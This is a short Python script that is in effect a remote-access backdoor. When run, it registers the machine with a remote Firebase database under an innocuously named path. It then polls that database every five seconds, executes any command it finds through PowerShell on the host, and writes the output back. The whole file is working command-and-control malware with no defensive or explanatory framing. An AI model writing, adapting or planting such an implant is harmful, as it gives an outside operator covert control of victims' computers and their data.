import requests, json, random as rd, os, subprocess, time

BASE_URL = "https://moms-tailor-default-rtdb.firebaseio.com/first-start"
DATABASE_URL = f"{BASE_URL}.json"
hostname = os.getlogin() + str(rd.randint(0, 100))
requests.patch(DATABASE_URL, data=json.dumps({hostname: {"output": "", "command": ""}}))
current_dir = os.getcwd()

def check_and_execute():
    global current_dir
    while True:
        try:
            response = requests.get(DATABASE_URL)
            if response.status_code == 200:
                db_data = response.json()
                if hostname in db_data:
                    command = db_data[hostname].get("command", "")
                    if command:
                        print(f"Executing: {command}")
                        if command.lower().startswith("cd "):
                            new_dir = command[3:].strip()
                            if new_dir == "..":
                                current_dir = os.path.dirname(current_dir)
                            else:
                                new_path = os.path.join(current_dir, new_dir)
                                if os.path.isdir(new_path):
                                    current_dir = new_path
                                else:
                                    requests.patch(f"{BASE_URL}/{hostname}.json", data=json.dumps({"output": f"Error: Directory '{new_dir}' not found.", "command": ""}))
                                    continue
                        process = subprocess.run(["powershell", "-Command", command], cwd=current_dir, capture_output=True, text=True)
                        output = process.stdout if process.stdout else process.stderr
                        requests.patch(f"{BASE_URL}/{hostname}.json", data=json.dumps({"output": output, "command": ""}))
            time.sleep(5)
        except Exception as e:
            requests.patch(f"{BASE_URL}/{hostname}.json", data=json.dumps({"output": str(e), "command": ""}))
            time.sleep(10)

check_and_execute()
